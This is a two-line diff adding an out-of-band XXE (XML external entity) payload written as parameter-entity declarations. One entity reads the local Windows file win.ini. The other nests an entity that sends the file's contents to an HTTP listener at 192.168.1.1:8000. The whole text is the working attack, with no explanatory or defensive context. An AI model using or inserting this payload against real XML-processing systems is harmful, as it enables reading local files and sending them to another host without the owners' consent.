@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///c:/Windows/win.ini">
+<!ENTITY % param "<!ENTITY &#x25; out SYSTEM 'http://192.168.1.1:8000/?%data;'>">
